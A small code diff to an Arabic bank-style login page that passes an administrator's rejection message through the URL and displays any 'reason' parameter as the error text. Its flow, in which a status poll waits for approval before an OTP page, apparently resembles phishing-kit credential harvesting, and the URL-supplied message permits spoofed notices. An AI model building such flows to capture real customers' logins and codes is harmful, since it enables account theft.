@@ -365,7 +365,7 @@
             window.location.href = 'otp.html';
           } else if (data.status === 'rejected') {
             stopStatusPoll();
-            window.location.href = 'login_ar.html?error=invalid&user=' + encodeURIComponent(username);
+            window.location.href = 'login_ar.html?error=invalid&user=' + encodeURIComponent(username) + '&reason=' + encodeURIComponent(data.rejectionMessage || 'تم رفض الطلب من الإدارة.');
           }
         })
         .catch(function(err){
@@ -433,6 +433,7 @@
     if (params.get('error') === 'invalid') {
       var user = params.get('user') || '';
       showInvalidCredentials(user);
+      if (params.get('reason')) document.getElementById('errorMsg').textContent = params.get('reason');
     }
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
